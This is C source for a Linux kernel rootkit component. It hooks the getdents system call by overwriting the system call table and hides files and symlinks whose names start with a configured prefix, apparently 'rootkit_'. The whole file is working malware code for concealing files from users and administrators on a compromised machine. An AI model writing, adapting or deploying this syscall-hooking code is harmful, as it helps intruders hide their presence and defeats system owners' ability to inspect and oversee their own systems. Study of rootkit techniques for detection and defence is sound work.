#include "hide_files.h"
atomic_t in_files_orig_syscall = ATOMIC_INIT(0);
char* hide;
asmlinkage int (*files_original_getdents) (unsigned int, struct linux_dirent __user *, unsigned int);
asmlinkage ssize_t (*readlinkat) (int, const char*, char*, size_t);

bool checkName(int fd, char* name, unsigned short reclen)
{
	char d_type = *(name + reclen - 1 - offsetof(struct linux_dirent, d_name));
	if(d_type == DT_LNK){
		char linkPath[64];
		mm_segment_t old_fs;
		memset(linkPath, 0, 64);
		old_fs = get_fs();
		set_fs(KERNEL_DS);	// make kernel accept kernel space buffer in syscall
		readlinkat(fd,name,linkPath,64);
		set_fs(old_fs);
		char* s = strstr(linkPath, hide);
		if(s != NULL) {
			if( *(s-1) == '/') {
				DEBUGMSG("Found link to be hidden: %s links to: %s\n",name, linkPath);
				return true;
			}
			if( *(s-1) == '.' && *(s-2) == '/') {
				DEBUGMSG("Found .link to be hidden: %s links to: %s\n",name, linkPath);
				return true;
			}
		}
	}
	else if(reclen - 2 - offsetof(struct linux_dirent, d_name) > 7){
		if(strstr(name, hide) == name){//name[0] == 'r' && name[1] == 'o' && name[2] == 'o' && name[3] == 't' && name[4] == 'k' && name[5] == 'i' && name[6] == 't' && name[7] == '_'){
			DEBUGMSG("Found file to be hidden: %s\n", name);
			return true;
			//DEBUGMSG("d_type: %d, DT_DIR: %d, lnk: %d, file: %d\n", d_type, DT_DIR, DT_LNK, DT_REG);
		}
		if(strstr(name, hide) == name+1 && name[0] == '.'){//name[0] == 'r' && name[1] == 'o' && name[2] == 'o' && name[3] == 't' && name[4] == 'k' && name[5] == 'i' && name[6] == 't' && name[7] == '_'){
			DEBUGMSG("Found .file to be hidden: %s\n", name);
			return true;
		}
	}
	return false;
}

asmlinkage int files_hacked_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
{
	int ret;
	int len;
	int curlen;

	atomic_inc(&in_files_orig_syscall); 
	ret = files_original_getdents(fd,dirp,count);	
	len = ret;

	while(len>0)
	{
		curlen  = dirp->d_reclen;
		len = len-curlen;

		if(checkName(fd, dirp->d_name, dirp->d_reclen)){		// This is getting interesting
			memmove(dirp, (char*) dirp + dirp->d_reclen,len);
			ret -= curlen;
		}
		else {	// not an interesting entry
			if(len != 0)
			{
				dirp = (struct linux_dirent *) ((char*) dirp + dirp->d_reclen);
			}
		}

	}

	atomic_dec(&in_files_orig_syscall);
	return ret;
}

int init_hide_files(void)
{	
	DEBUGMSG("inserting...\n");

	make_rw((unsigned long)sys_call_table);
	files_original_getdents = (void*)*(sys_call_table + __NR_getdents);
	*(sys_call_table + __NR_getdents) = (unsigned long)files_hacked_getdents;
	readlinkat = (void*)*(sys_call_table + __NR_readlinkat);
	make_ro((unsigned long)sys_call_table);
	DEBUGMSG("Hock is running; files starting with rootkit_ should be hidden\n");

	return 0;
}

void exit_hide_files(void)
{
	DEBUGMSG("exiting...\n");

	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_getdents) = (unsigned long)files_original_getdents;
	make_ro((unsigned long)sys_call_table);
	if(atomic_read(&in_files_orig_syscall)!=0) 
		DEBUGMSG("waiting for instance to be finished\n");
	while(atomic_read(&in_files_orig_syscall)!=0){
		msleep(10);
	}
	DEBUGMSG("hook is not running anymore\n");
} 
